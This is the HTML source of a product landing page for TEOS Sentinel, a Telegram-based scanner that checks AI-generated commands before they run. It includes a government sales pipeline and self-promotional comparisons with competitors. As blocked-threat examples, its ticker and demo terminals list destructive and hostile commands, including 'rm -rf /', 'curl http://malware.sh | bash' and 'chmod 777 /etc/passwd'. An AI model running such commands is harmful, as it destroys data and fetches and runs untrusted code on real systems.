  .nav-links { display: none; }
  .status-bar { font-size: 10px; gap: 16px; }
  .features-grid, .roadmap-grid { grid-template-columns: 1fr; }
  .engine-inner { grid-template-columns: 1fr 1fr; }
  .trust-bar { gap: 24px; }
  .footer-inner { grid-template-columns: 1fr; }
  .footer-bottom { flex-direction: column; }
  .video-timeline { flex-direction: column; }
  .vt-step { border-right: none; border-bottom: 1px solid var(--border); }
  .vt-step:last-child { border-bottom: none; }
}

/* ── LANGUAGE SWITCHER ── */
.lang-switcher {
  position: relative; display: flex; align-items: center;
}
.lang-btn {
  display: flex; align-items: center; gap: 7px;
  background: rgba(201,168,76,0.06);
  border: 1px solid var(--border3);
  color: var(--text-dim); cursor: pointer;
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px; letter-spacing: 0.07em;
  padding: 6px 12px; border-radius: 2px;
  transition: all 0.2s; white-space: nowrap;
}
.lang-btn:hover { border-color: var(--gold-dim); color: var(--gold); }
.lang-btn .lang-flag { font-size: 14px; line-height: 1; }
.lang-btn .lang-arrow { font-size: 9px; opacity: 0.5; transition: transform 0.2s; }
.lang-btn.open .lang-arrow { transform: rotate(180deg); }
.lang-dropdown {
  position: absolute; top: calc(100% + 6px); right: 0;
  background: var(--surface);
  border: 1px solid var(--border2);
  border-radius: 3px; overflow: hidden;
  min-width: 170px;
  box-shadow: 0 16px 40px rgba(0,0,0,0.5);
  display: none; z-index: 300;
}
.lang-dropdown.open { display: block; animation: dropIn 0.18s ease; }
@keyframes dropIn {
  from { opacity: 0; transform: translateY(-6px); }
  to   { opacity: 1; transform: translateY(0); }
}
.lang-option {
  display: flex; align-items: center; gap: 10px;
  padding: 10px 14px; cursor: pointer;
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px; color: var(--text-dim);
  transition: background 0.15s; border: none;
  background: transparent; width: 100%; text-align: left;
}
.lang-option:hover { background: var(--surface2); color: var(--text); }
.lang-option.active { color: var(--gold); background: rgba(201,168,76,0.06); }
.lang-option .lo-flag { font-size: 16px; }
.lang-option .lo-name { font-weight: 700; }
.lang-option .lo-native { font-size: 10px; color: var(--text-muted); margin-left: auto; }
[dir="rtl"] .nav-links { flex-direction: row-reverse; }
[dir="rtl"] .hero h1, [dir="rtl"] .hero-sub,
[dir="rtl"] .section-title, [dir="rtl"] .section-sub,
[dir="rtl"] .feat-desc, [dir="rtl"] .step-desc,
[dir="rtl"] .rm-desc, [dir="rtl"] .ent-p { direction: rtl; text-align: right; }
.translate-bar {
  position: fixed; top: 0; left: 0; right: 0; z-index: 9999;
  height: 2px; background: var(--border); display: none;
}
.translate-bar-fill {
  height: 100%;
  background: linear-gradient(90deg, var(--gold-dim), var(--gold));
  width: 0%; transition: width 0.4s ease;
}
.translate-toast {
  position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
  background: var(--surface); border: 1px solid var(--border2);
  border-radius: 3px; padding: 10px 18px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px; color: var(--text-dim);
  box-shadow: 0 8px 32px rgba(0,0,0,0.4);
  display: none; z-index: 9999; white-space: nowrap;
  align-items: center; gap: 8px;
}
.translate-toast.show { display: flex; animation: toastIn 0.2s ease; }
@keyframes toastIn {
  from { opacity: 0; transform: translateX(-50%) translateY(8px); }
  to   { opacity: 1; transform: translateX(-50%) translateY(0); }
}
</style>
</head>
<body>


<!-- TRANSLATE BAR + TOAST -->
<div class="translate-bar" id="translateBar"><div class="translate-bar-fill" id="translateFill"></div></div>
<div class="translate-toast" id="translateToast">
  <span id="toastFlag">🌐</span>
  <span id="toastMsg">Translating...</span>
</div>

<!-- NAV -->
<nav>
  <a href="#" class="nav-brand">
    <div class="brand-shield"></div>
    <span class="brand-name">TEOS Sentinel</span>
  </a>
  <ul class="nav-links">
    <li><a href="#demo">Demo</a></li>
    <li><a href="#features">Features</a></li>
    <li><a href="#compare">Compare</a></li>
    <li><a href="#pricing">Pricing</a></li>
    <li><a href="#roadmap">Roadmap</a></li>
    <li>
      <div class="lang-switcher" id="langSwitcher">
        <button class="lang-btn" id="langBtn" onclick="toggleLangMenu(event)" aria-label="Language selector">
          <span class="lang-flag" id="currentFlag">🌐</span>
          <span id="currentLangLabel">EN</span>
          <span class="lang-arrow">▼</span>
        </button>
        <div class="lang-dropdown" id="langDropdown">
          <button class="lang-option active" onclick="switchLang('en','🇺🇸','EN',false)" id="opt-en">
            <span class="lo-flag">🇺🇸</span>
            <span class="lo-name">English</span>
            <span class="lo-native">English</span>
          </button>
          <button class="lang-option" onclick="switchLang('ar','🇸🇦','AR',true)" id="opt-ar">
            <span class="lo-flag">🇸🇦</span>
            <span class="lo-name">Arabic</span>
            <span class="lo-native">العربية</span>
          </button>
          <button class="lang-option" onclick="switchLang('id','🇮🇩','ID',false)" id="opt-id">
            <span class="lo-flag">🇮🇩</span>
            <span class="lo-name">Indonesian</span>
            <span class="lo-native">Bahasa Indonesia</span>
          </button>
        </div>
      </div>
    </li>
    <li><a href="https://t.me/teoslinker_bot" class="nav-cta">Try Free →</a></li>
  </ul>
</nav>

<!-- STATUS BAR -->
<div class="status-bar">
  <div class="status-item"><div class="status-dot"></div> MCP Engine v2.0 — Online</div>
  <div class="status-item"><div class="status-dot"></div> Telegram Bot — Online</div>
  <div class="status-item"><div class="status-dot"></div> 25 Named Rules Active</div>
  <div class="status-item"><div class="status-dot"></div> 37 Tests Passing</div>
</div>

<!-- HERO -->
<section class="hero">
  <div class="hero-glow"></div>
  <div class="hero-glow2"></div>
  <div class="engine-badge">
    <div class="badge-pulse"></div>
    Engine v2 Stable · Alexandria, Egypt · 75+ Countries
  </div>
  <h1>
    Your AI agent runs<br>
    <span class="line-strike">anything.</span><br>
    <em>We decide what executes.</em>
  </h1>
  <p class="hero-sub">
    <strong>TEOS Sentinel Shield</strong> intercepts AI-generated commands,<br>
    scripts, and pipelines — and blocks threats <strong>before execution</strong>.<br>
    Not after the breach. Before.
  </p>
  <div class="hero-ctas">
    <a href="https://t.me/teoslinker_bot" class="btn-primary">⚡ Scan Your First Command →</a>
    <a href="#video-demo" class="btn-secondary">Watch Demo ↓</a>
  </div>
  <p class="micro">5 free scans · no signup · no credit card · Telegram instant</p>
  <div class="trust-bar">
    <div class="trust-item"><span class="num" data-target="25">25</span>&nbsp;Named threat rules</div>
    <div class="trust-item"><span class="num" data-target="37">37</span>&nbsp;Tests passing</div>
    <div class="trust-item"><span class="num" data-target="75">75</span>+&nbsp;countries reached</div>
    <div class="trust-item"><span class="num" data-target="528">528</span>&nbsp;community members</div>
  </div>
</section>

<!-- THREAT TICKER -->
<div class="threat-ticker" aria-hidden="true">
  <div class="ticker-inner">
    <span class="tick-item"><span class="tick-blocked">🛑 BLOCKED</span><span class="tick-label">rm -rf / · R01.DESTRUCTIVE_SHELL · Score 100/100</span></span>
    <span class="tick-item"><span class="tick-blocked">⚠️ WARNED</span><span class="tick-label">DROP TABLE users; · R09.SQL_INJECTION · Score 75/100</span></span>
    <span class="tick-item" style="color:var(--scan-green)">✅ ALLOWED&nbsp;<span class="tick-label" style="color:var(--text-muted)">console.log("hello") · R00.CLEAN · Score 0/100</span></span>
    <span class="tick-item"><span class="tick-blocked">🛑 BLOCKED</span><span class="tick-label">curl http://malware.sh | bash · R03.CURL_EXEC · Score 95/100</span></span>
    <span class="tick-item"><span class="tick-blocked">🛑 BLOCKED</span><span class="tick-label">eval(atob("...")) · R07.BASE64_EXEC · Score 88/100</span></span>
    <span class="tick-item"><span class="tick-blocked">⚠️ WARNED</span><span class="tick-label">event-stream@3.3.6 · R14.KNOWN_MALICIOUS_PKG · Score 70/100</span></span>
    <span class="tick-item" style="color:var(--scan-green)">✅ ALLOWED&nbsp;<span class="tick-label" style="color:var(--text-muted)">npm install lodash · R00.CLEAN · Score 0/100</span></span>
    <span class="tick-item"><span class="tick-blocked">🛑 BLOCKED</span><span class="tick-label">chmod 777 /etc/passwd · R02.CHMOD_ESCALATION · Score 90/100</span></span>
    <!-- duplicate for loop -->
    <span class="tick-item"><span class="tick-blocked">🛑 BLOCKED</span><span class="tick-label">rm -rf / · R01.DESTRUCTIVE_SHELL · Score 100/100</span></span>
    <span class="tick-item"><span class="tick-blocked">⚠️ WARNED</span><span class="tick-label">DROP TABLE users; · R09.SQL_INJECTION · Score 75/100</span></span>
    <span class="tick-item" style="color:var(--scan-green)">✅ ALLOWED&nbsp;<span class="tick-label" style="color:var(--text-muted)">console.log("hello") · R00.CLEAN · Score 0/100</span></span>
    <span class="tick-item"><span class="tick-blocked">🛑 BLOCKED</span><span class="tick-label">curl http://malware.sh | bash · R03.CURL_EXEC · Score 95/100</span></span>
    <span class="tick-item"><span class="tick-blocked">🛑 BLOCKED</span><span class="tick-label">eval(atob("...")) · R07.BASE64_EXEC · Score 88/100</span></span>
    <span class="tick-item"><span class="tick-blocked">⚠️ WARNED</span><span class="tick-label">event-stream@3.3.6 · R14.KNOWN_MALICIOUS_PKG · Score 70/100</span></span>
    <span class="tick-item" style="color:var(--scan-green)">✅ ALLOWED&nbsp;<span class="tick-label" style="color:var(--text-muted)">npm install lodash · R00.CLEAN · Score 0/100</span></span>
    <span class="tick-item"><span class="tick-blocked">🛑 BLOCKED</span><span class="tick-label">chmod 777 /etc/passwd · R02.CHMOD_ESCALATION · Score 90/100</span></span>
  </div>
</div>

<!-- ════════════════════════════════════════════
     DEMO VIDEO SECTION
     ════════════════════════════════════════════
     TO ADD YOUR VIDEO:
     Option A — MP4 file on your server:
       Replace the <div class="video-placeholder"> block with:
       <video controls poster="thumbnail.jpg">
         <source src="demo.mp4" type="video/mp4">
       </video>

     Option B — YouTube embed:
       Replace the <div class="video-placeholder"> block with:
       <iframe width="100%" style="aspect-ratio:16/9"
         src="https://www.youtube.com/embed/YOUR_VIDEO_ID"
         frameborder="0" allowfullscreen></iframe>

     Option C — Loom embed:
       Replace the <div class="video-placeholder"> block with:
       <iframe width="100%" style="aspect-ratio:16/9"
         src="https://www.loom.com/embed/YOUR_LOOM_ID"
         frameborder="0" allowfullscreen></iframe>
     ════════════════════════════════════════════ -->
<section class="video-section" id="video-demo">
  <div class="label reveal">// Live Demo</div>
  <h2 class="section-title reveal">See TEOS block a real threat<br><em style="font-style:italic;color:var(--gold)">in under 2 seconds.</em></h2>
  <p class="section-sub reveal">Open Telegram. Send a dangerous command. Watch TEOS return a verdict before execution. No account. No config. Just instant security.</p>

  <div class="video-tabs reveal">
    <button class="vtab active" onclick="setTab(this,'full')">Full Product Demo</button>
    <button class="vtab" onclick="setTab(this,'scan')">Code Scan — /scan</button>
    <button class="vtab" onclick="setTab(this,'deps')">Deps Audit — /deps</button>
    <button class="vtab" onclick="setTab(this,'ci')">CI/CD — /ci</button>
  </div>

  <div class="video-wrapper reveal">

    <!-- ▼▼▼ VIDEO PLACEHOLDER — REPLACE THIS ENTIRE BLOCK WHEN YOU HAVE YOUR RECORDING ▼▼▼ -->
    <div class="video-placeholder">
      <div class="video-corner tl"></div>
      <div class="video-corner tr"></div>
      <div class="video-corner bl"></div>
      <div class="video-corner br"></div>

      <div class="video-badge">
        <div class="badge-pulse"></div>
        Demo Recording Coming Soon
      </div>

      <div class="play-ring">
        <div class="play-icon"></div>
      </div>

      <div class="placeholder-text">TEOS Sentinel Shield — Product Demo</div>
      <div class="placeholder-sub">Record using OBS / Loom / QuickTime · see instructions below ↓</div>
    </div>
    <!-- ▲▲▲ END PLACEHOLDER ▲▲▲ -->

    <!-- WHAT HAPPENS IN THE VIDEO — timeline shown below the player -->
    <div class="video-timeline">
      <div class="vt-step">
        <div class="vt-time">0:00 – 0:15</div>
        <div class="vt-label">Open @teoslinker_bot on Telegram</div>
      </div>
      <div class="vt-step">
        <div class="vt-time">0:15 – 0:35</div>
        <div class="vt-label">Send <code>/scan rm -rf /</code> → BLOCK 100/100</div>
      </div>
      <div class="vt-step">
        <div class="vt-time">0:35 – 0:50</div>
        <div class="vt-label">Send <code>/scan console.log("ok")</code> → ALLOW 0/100</div>
      </div>
      <div class="vt-step">
        <div class="vt-time">0:50 – 1:00</div>
        <div class="vt-label">Show <code>/status</code> — credits, engine version, plan</div>
      </div>
    </div>
  </div>

  <!-- HOW TO RECORD — internal note, shows only in dev -->
  <div class="record-hint reveal">
    <div class="rh-title">// How to record this demo (internal — remove before final launch)</div>
    <div class="rh-step"><span class="rh-num">1.</span><span>Open Telegram on phone or desktop. Navigate to <code>@teoslinker_bot</code>.</span></div>
    <div class="rh-step"><span class="rh-num">2.</span><span>On Mac: use <code>QuickTime → New Screen Recording</code>. On Windows: use <code>Win + G</code> (Xbox Game Bar) or OBS.</span></div>
    <div class="rh-step"><span class="rh-num">3.</span><span>Record: type <code>/scan rm -rf /</code> → show BLOCK verdict → then <code>/scan console.log("hello")</code> → show ALLOW.</span></div>
    <div class="rh-step"><span class="rh-num">4.</span><span>Keep it under 90 seconds. No narration needed — the verdicts speak for themselves.</span></div>
    <div class="rh-step"><span class="rh-num">5.</span><span>Upload to Loom (free) → copy embed URL → replace the <code>video-placeholder</code> div above with the iframe embed.</span></div>
    <div class="rh-step"><span class="rh-num">6.</span><span>Delete this <code>.record-hint</code> block when done.</span></div>
  </div>
</section>

<!-- LIVE DEMO TERMINALS -->
<section class="terminal-section" id="demo">
  <div class="label reveal">// Live Verdicts</div>
  <h2 class="section-title reveal">Three commands. Three verdicts.<br><em style="font-style:italic;color:var(--gold)">Instant.</em></h2>
  <p class="section-sub reveal">Every scan returns a risk score, a rule ID, and a human-readable explanation. No dashboards. No config. Just Telegram.</p>

  <div class="terminals reveal">
    <!-- BLOCK -->
    <div class="term">
      <div class="term-bar">
        <div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div>
        <span class="term-name">THREAT BLOCKED</span>
      </div>
      <div class="term-body">
        <div><span class="tp">›</span> <span class="tc">/scan rm -rf /</span></div>
        <div class="tmt">analyzing command...</div>
        <div>&nbsp;</div>
        <div class="tbl">🛑 BLOCK — 100/100</div>
        <div class="tsc">Rule: R01.DESTRUCTIVE_SHELL</div>
        <div class="tr">↳ rm -rf permanently deletes all files.</div>
        <div class="tr">↳ Wiper malware signature detected.</div>
        <div class="tr">↳ Execution prevented.</div>
        <div>&nbsp;</div>
        <div class="tmt">Credit not consumed.</div>
      </div>
      <div class="term-verdict">
        <span class="verdict-pill v-block">BLOCK</span>
        <span class="verdict-rule">R01 · score 100</span>
      </div>
    </div>

    <!-- WARN -->
    <div class="term">
      <div class="term-bar">
        <div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div>
        <span class="term-name">WARN RAISED</span>
      </div>
      <div class="term-body">
        <div><span class="tp">›</span> <span class="tc">/scan DROP TABLE users;</span></div>
        <div class="tmt">analyzing command...</div>
        <div>&nbsp;</div>
        <div class="twn">⚠️ WARN — 75/100</div>
        <div class="tsc">Rule: R09.SQL_INJECTION</div>
        <div class="tr">↳ DROP TABLE destroys database tables.</div>
        <div class="tr">↳ SQL injection risk pattern detected.</div>
        <div class="tr">↳ Human review recommended.</div>
        <div>&nbsp;</div>
        <div class="tmt">Credits left: 997</div>
      </div>
      <div class="term-verdict">
        <span class="verdict-pill v-warn">WARN</span>
        <span class="verdict-rule">R09 · score 75</span>
      </div>
    </div>

    <!-- ALLOW -->
    <div class="term">
      <div class="term-bar">
        <div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div>
        <span class="term-name">ALLOW PASSED</span>
      </div>
      <div class="term-body">
        <div><span class="tp">›</span> <span class="tc">/scan console.log("hello")</span></div>
        <div class="tmt">analyzing command...</div>
        <div>&nbsp;</div>
        <div class="tok">✅ ALLOW — 0/100</div>
        <div class="tsc">Rule: R00.CLEAN</div>
        <div class="tr">↳ No destructive patterns detected.</div>
        <div class="tr">↳ No injection vectors identified.</div>
        <div class="tr">↳ Safe to execute.</div>
        <div>&nbsp;</div>
        <div class="tmt">Credits left: 996</div>
      </div>
      <div class="term-verdict">
        <span class="verdict-pill v-allow">ALLOW</span>
        <span class="verdict-rule">R00 · score 0</span>
      </div>
    </div>
  </div>
</section>

<!-- ENGINE STATS -->
<div class="engine-stats">
  <div class="engine-inner">
    <div class="estat">
      <div class="estat-num" data-target="25">25</div>
      <div class="estat-label">Named Rules</div>
      <div class="estat-sub">R01 – R25 active</div>
    </div>
    <div class="estat">
      <div class="estat-num" data-target="37">37</div>
      <div class="estat-label">Tests Passing</div>
      <div class="estat-sub">Engine v2 stable</div>
    </div>
    <div class="estat">
      <div class="estat-num" data-target="3">3</div>
      <div class="estat-label">Services Online</div>
      <div class="estat-sub">MCP · Bot · Activation</div>
    </div>
    <div class="estat">
      <div class="estat-num">v2.0</div>
      <div class="estat-label">Engine Version</div>
      <div class="estat-sub">Production stable</div>
    </div>
  </div>
</div>

<!-- HOW IT WORKS -->
<section class="flow-section" id="how">
  <div class="label reveal">// Architecture</div>
  <h2 class="section-title reveal">Generate → Validate → <em style="color:var(--gold);font-style:italic;">Execute</em></h2>
  <p class="section-sub reveal">TEOS inserts a deterministic checkpoint between AI generation and runtime. Every single time — no exceptions.</p>
  <div class="flow-steps reveal">
    <div class="flow-step">
      <div class="step-n">01</div>
      <div class="step-ti">Send Command</div>
      <p class="step-desc">Paste any code, shell command, dependency list, or CI/CD pipeline step into Telegram. No account. No SDK. No backend changes.</p>
    </div>
    <div class="flow-step">
      <div class="step-n">02</div>
      <div class="step-ti">Engine Analyzes</div>
      <p class="step-desc">25 named rules scan against wiper patterns, eval/exec abuse, injection vectors, secret exposure, known malicious packages, and unsafe CI permissions.</p>
    </div>
    <div class="flow-step">
      <div class="step-n">03</div>
      <div class="step-ti">Verdict Returned</div>
      <p class="step-desc">BLOCK, WARN, or ALLOW — with a rule ID, risk score, and full human-readable explanation. Structured output your agent or pipeline can act on immediately.</p>
    </div>
    <div class="flow-step">
      <div class="step-n">04</div>
      <div class="step-ti">Audit Logged</div>
      <p class="step-desc">Every decision is recorded. Credits consumed only on clean passes. Full audit trail for enterprise compliance. Transparent and reversible.</p>
    </div>
  </div>
</section>

<!-- FEATURES -->
<section class="features-section" id="features">
  <div class="features-inner">
    <div class="label reveal">// Scan Engines</div>
    <h2 class="section-title reveal">Three engines.<br>One interface.</h2>
    <p class="section-sub reveal">Every command returns a structured verdict — no dashboards, no config, no waiting. All via @teoslinker_bot on Telegram.</p>
    <div class="features-grid reveal">
      <div class="feat">
        <div class="feat-icon">🛡️</div>
        <div class="feat-cmd">/scan &lt;code&gt;</div>
        <div class="feat-title">Pre-Execution Code Scan</div>
        <p class="feat-desc">Analyzes shell commands, scripts, and code snippets against 10+ threat categories: wiper patterns, eval/exec abuse, command injection, subprocess misuse, chmod escalation, secret leakage, and base64 execution chains.</p>
        <div class="feat-tags">
          <span class="ftag">rm -rf</span><span class="ftag">eval()</span><span class="ftag">curl|bash</span>
          <span class="ftag">DROP TABLE</span><span class="ftag">sudo</span><span class="ftag">chmod 777</span>
        </div>
      </div>
      <div class="feat">
        <div class="feat-icon">📦</div>
        <div class="feat-cmd">/deps &lt;package.json&gt;</div>
        <div class="feat-title">Dependency Supply Chain Audit</div>
        <p class="feat-desc">Scans npm manifests against 14+ known compromised packages — including event-stream (Bitcoin wallet attack), ua-parser-js (crypto miner), node-ipc (protestware). Pre-install. Not post-incident.</p>
        <div class="feat-tags">
          <span class="ftag">event-stream</span><span class="ftag">node-ipc</span>
          <span class="ftag">ua-parser-js</span><span class="ftag">lodash CVE</span>
        </div>
      </div>
      <div class="feat">
        <div class="feat-icon">⚙️</div>
        <div class="feat-cmd">/ci &lt;pipeline&gt;</div>
        <div class="feat-title">CI/CD Pipeline Hardening</div>
        <p class="feat-desc">Scans GitHub Actions YAML, Dockerfiles, and pipeline configs for write-all permissions, secret exposure, curl|bash execution, privileged containers, and enterprise-risk misconfigurations.</p>
        <div class="feat-tags">
          <span class="ftag">write-all</span><span class="ftag">secrets</span>
          <span class="ftag">--privileged</span><span class="ftag">curl|bash</span>
        </div>
      </div>
      <div class="feat">
        <div class="feat-icon">✈️</div>
        <div class="feat-cmd">@teoslinker_bot</div>
        <div class="feat-title">Telegram-Native Gateway</div>
        <p class="feat-desc">Zero-friction access via Telegram. Commands: /scan, /deps, /ci, /status, /upgrade, /credits. No SDK, no backend changes, no account setup. Runs in 60 seconds from first message.</p>
        <div class="feat-tags">
          <span class="ftag">zero-signup</span><span class="ftag">5 free scans</span><span class="ftag">instant</span>
        </div>
      </div>
      <div class="feat">
        <div class="feat-icon">📊</div>
        <div class="feat-cmd">/status · /credits</div>
        <div class="feat-title">Credits & Audit Trail</div>
        <p class="feat-desc">Scan credits tracked per user. Credits consumed only on clean passes — blocked threats don't cost you. Upgrade tiers unlock higher limits. Full audit logs for compliance teams.</p>
        <div class="feat-tags">
          <span class="ftag">per-scan tracking</span><span class="ftag">auto credits</span><span class="ftag">audit logs</span>
        </div>
      </div>
      <div class="feat">
        <div class="feat-icon">🏛️</div>
        <div class="feat-cmd">Enterprise / Gov</div>
        <div class="feat-title">Sovereign Deployment Option</div>
        <p class="feat-desc">Dedicated instance for government and regulated industries. Custom threat policy engine, ICBC constitutional alignment, MENA-sovereign architecture, full audit trail, SLA guarantee. Built for autonomous AI at scale.</p>
        <div class="feat-tags">
          <span class="ftag">self-hosted</span><span class="ftag">custom rules</span>
          <span class="ftag">ICBC aligned</span><span class="ftag">SLA</span>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- COMPARE -->
<section class="compare-section" id="compare">
  <div class="label reveal">// Competitive Edge</div>
  <h2 class="section-title reveal">The only <em style="font-style:italic;color:var(--gold)">pre-execution</em> layer.</h2>
  <p class="section-sub reveal">GitGuardian, Snyk, and Checkmarx scan post-commit. TEOS blocks before your agent even runs the command. That's a fundamentally different threat model.</p>
  <table class="compare-table reveal">
    <thead>
      <tr>
        <th>Capability</th>
        <th class="tc">🛡️ TEOS Sentinel</th>
        <th>GitGuardian</th>
        <th>Snyk</th>
        <th>Checkmarx</th>
      </tr>
    </thead>
    <tbody>
      <tr><td>Pre-execution blocking</td><td class="tc"><span class="cy">✅ Yes</span></td><td><span class="cn">❌ Post-commit only</span></td><td><span class="cn">❌ Post-commit only</span></td><td><span class="cn">❌</span></td></tr>
      <tr><td>Telegram-native UX</td><td class="tc"><span class="cy">✅ Yes</span></td><td><span class="cn">❌</span></td><td><span class="cn">❌</span></td><td><span class="cn">❌</span></td></tr>
      <tr><td>Free tier (no signup)</td><td class="tc"><span class="cy">✅ 5 free scans</span></td><td><span class="cn">❌</span></td><td><span class="cp">⚠️ Limited</span></td><td><span class="cn">❌ Enterprise only</span></td></tr>
      <tr><td>Shell command scanning</td><td class="tc"><span class="cy">✅ Yes (R01–R08)</span></td><td><span class="cn">❌</span></td><td><span class="cn">❌</span></td><td><span class="cp">⚠️ Limited</span></td></tr>
      <tr><td>Dependency CVE audit</td><td class="tc"><span class="cy">✅ Builder+</span></td><td><span class="cy">✅</span></td><td><span class="cy">✅</span></td><td><span class="cy">✅</span></td></tr>
      <tr><td>CI/CD pipeline scan</td><td class="tc"><span class="cy">✅ Yes</span></td><td><span class="cp">⚠️ Partial</span></td><td><span class="cp">⚠️ Partial</span></td><td><span class="cy">✅</span></td></tr>
      <tr><td>MENA sovereign focus</td><td class="tc"><span class="cy">✅ Yes</span></td><td><span class="cn">❌</span></td><td><span class="cn">❌</span></td><td><span class="cn">❌</span></td></tr>
      <tr><td>AI agent native design</td><td class="tc"><span class="cy">✅ Yes</span></td><td><span class="cn">❌</span></td><td><span class="cn">❌</span></td><td><span class="cn">❌</span></td></tr>
    </tbody>
  </table>
</section>

<!-- ════════════════════════════════════════════
     GOVERNMENT TARGET MAP — MENA
     Based on strategic intelligence: Egypt → UAE → Saudi
     ════════════════════════════════════════════ -->
<section class="features-section" id="government" style="padding-top:120px;padding-bottom:120px;">
  <div class="features-inner">
    <div class="label reveal">// Government Pipeline</div>
    <h2 class="section-title reveal">MENA is buying<br><em style="font-style:italic;color:var(--gold)">AI governance.</em></h2>
    <p class="section-sub reveal">Egypt, UAE, and Saudi Arabia are actively investing in AI strategy, execution control, and sovereign digital infrastructure. TEOS is the missing enforcement layer.</p>

    <!-- Country tabs -->
    <div class="video-tabs reveal" style="margin-bottom:32px;">
      <button class="vtab active" onclick="setGovTab(this,'eg')">🇪🇬 Egypt — Start Here</button>
      <button class="vtab" onclick="setGovTab(this,'ae')">🇦🇪 UAE — Fast Track</button>
      <button class="vtab" onclick="setGovTab(this,'sa')">🇸🇦 Saudi — Big Money</button>
    </div>

    <!-- EGYPT -->
    <div id="gov-eg" class="gov-panel reveal">
      <div class="features-grid" style="margin-top:0;">
        <div class="feat">
          <div class="feat-icon">🏛️</div>
          <div class="feat-cmd">Tier 1 — Direct Buyer</div>
          <div class="feat-title">ITIDA</div>
          <p class="feat-desc">Information Technology Industry Development Agency. Core ICT + startup + AI ecosystem driver. Manages national tech growth and digital economy programs. Actively supports AI adoption.</p>
          <div class="feat-tags"><span class="ftag">AI startup programs</span><span class="ftag">DevSecOps pipelines</span><span class="ftag">national AI init</span></div>
          <div style="margin-top:16px;padding:12px 14px;background:rgba(201,168,76,0.06);border:1px solid var(--gold-dim);border-radius:2px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--gold-dim);line-height:1.6;">"Execution control layer for Egypt's AI ecosystem" · Pilot: $5K–$10K</div>
        </div>
        <div class="feat">
          <div class="feat-icon">📡</div>
          <div class="feat-cmd">Tier 1 — Direct Buyer</div>
          <div class="feat-title">MCIT</div>
          <p class="feat-desc">Ministry of Communications and Information Technology. Owns Egypt's national AI strategy 2025–2030. Controls digital transformation programs. Infrastructure, governance, and real-world AI systems.</p>
          <div class="feat-tags"><span class="ftag">AI strategy 2030</span><span class="ftag">digital transformation</span><span class="ftag">gov AI</span></div>
          <div style="margin-top:16px;padding:12px 14px;background:rgba(201,168,76,0.06);border:1px solid var(--gold-dim);border-radius:2px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--gold-dim);line-height:1.6;">"Pre-execution enforcement layer for national AI systems"</div>
        </div>
        <div class="feat">
          <div class="feat-icon">🌆</div>
          <div class="feat-cmd">Tier 2 — Entry via Pilot</div>
          <div class="feat-title">TIEC + Smart Cities</div>
          <p class="feat-desc">Technology Innovation & Entrepreneurship Center (under ITIDA) for startup integration. Administrative Capital for Urban Development — smart city AI systems. Both need execution control.</p>
          <div class="feat-tags"><span class="ftag">startup incubation</span><span class="ftag">smart city AI</span><span class="ftag">TIEC</span></div>
          <div style="margin-top:16px;padding:12px 14px;background:rgba(201,168,76,0.06);border:1px solid var(--gold-dim);border-radius:2px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--gold-dim);line-height:1.6;">Easiest first deal. Warm + accessible. Start here.</div>
        </div>
      </div>
    </div>

    <!-- UAE -->
    <div id="gov-ae" class="gov-panel reveal" style="display:none;">
      <div class="features-grid" style="margin-top:0;">
        <div class="feat">
          <div class="feat-icon">🤖</div>
          <div class="feat-cmd">Tier 1 — Highest Priority</div>
          <div class="feat-title">UAE AI Office</div>
          <p class="feat-desc">UAE Artificial Intelligence Office. National AI leadership. Sets strategy + adoption across all government entities. Policy enforcement layer for AI execution is exactly their mandate.</p>
          <div class="feat-tags"><span class="ftag">AI policy</span><span class="ftag">national strategy</span><span class="ftag">enforcement</span></div>
          <div style="margin-top:16px;padding:12px 14px;background:rgba(201,168,76,0.06);border:1px solid var(--gold-dim);border-radius:2px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--gold-dim);line-height:1.6;">"Policy enforcement layer for AI execution" · Deal: $10K–$25K</div>
        </div>
        <div class="feat">
          <div class="feat-icon">🏗️</div>
          <div class="feat-cmd">Tier 1 — Fast Entry</div>
          <div class="feat-title">G42 + Injazat</div>
          <p class="feat-desc">G42: national-scale AI infrastructure player with direct government relationships. Injazat: government + enterprise digital transformation, complex public sector delivery. Both are your integration route.</p>
          <div class="feat-tags"><span class="ftag">G42</span><span class="ftag">Injazat</span><span class="ftag">infra layer</span></div>
          <div style="margin-top:16px;padding:12px 14px;background:rgba(201,168,76,0.06);border:1px solid var(--gold-dim);border-radius:2px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--gold-dim);line-height:1.6;">Partner route into government — fastest path to UAE deal.</div>
        </div>
        <div class="feat">
          <div class="feat-icon">📱</div>
          <div class="feat-cmd">Tier 1 — Regulatory</div>
          <div class="feat-title">TDRA</div>
          <p class="feat-desc">Telecommunications and Digital Government Regulatory Authority. Digital government + compliance regulation. Execution control and compliance audit trail are core to their remit.</p>
          <div class="feat-tags"><span class="ftag">digital gov</span><span class="ftag">compliance</span><span class="ftag">regulation</span></div>
          <div style="margin-top:16px;padding:12px 14px;background:rgba(201,168,76,0.06);border:1px solid var(--gold-dim);border-radius:2px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--gold-dim);line-height:1.6;">"Execution compliance layer" — regulatory framing.</div>
        </div>
      </div>
    </div>

    <!-- SAUDI -->
    <div id="gov-sa" class="gov-panel reveal" style="display:none;">
      <div class="features-grid" style="margin-top:0;">
        <div class="feat">
          <div class="feat-icon">🇸🇦</div>
          <div class="feat-cmd">Tier 1 — Critical Target</div>
          <div class="feat-title">SDAIA</div>
          <p class="feat-desc">Saudi Data and Artificial Intelligence Authority. Central AI + data authority. Controls AI strategy and data governance. Core pillars of Vision 2030. "Execution enforcement for AI governance" is a direct match.</p>
          <div class="feat-tags"><span class="ftag">AI strategy</span><span class="ftag">data governance</span><span class="ftag">Vision 2030</span></div>
          <div style="margin-top:16px;padding:12px 14px;background:rgba(201,168,76,0.06);border:1px solid var(--gold-dim);border-radius:2px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--gold-dim);line-height:1.6;">"Execution enforcement for AI governance" · Deal: $25K–$50K+</div>
        </div>
        <div class="feat">
